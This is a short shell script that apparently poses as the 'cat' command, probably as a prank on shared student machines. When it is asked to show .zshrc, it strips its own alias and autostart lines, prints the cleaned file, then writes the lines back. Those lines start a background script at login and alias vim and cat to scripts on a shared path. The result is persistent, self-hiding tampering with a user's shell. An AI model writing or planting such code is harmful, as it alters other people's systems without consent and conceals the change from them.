#!/bin/sh

if [ "$1" = ".zshrc" ]; then
	sed -i '' '/cat=/d' $HOME/.zshrc
	sed -i '' '/vim=/d' $HOME/.zshrc
	sed -i '' '/vscode_ugu/d' $HOME/.zshrc
	cat $1
	echo "sh vscode_ugu/uwu.sh & ; clear" >> ~/.zshrc
	echo "alias vim='/sgoinfre/goinfre/Perso/aalvarez/El_google_vasco/uvuim.sh'" >> ~/.zshrc
	echo "alias cat='/sgoinfre/goinfre/Perso/aalvarez/El_google_vasco/uwucat.sh'" >> ~/.zshrc
else
	cat $1
fi
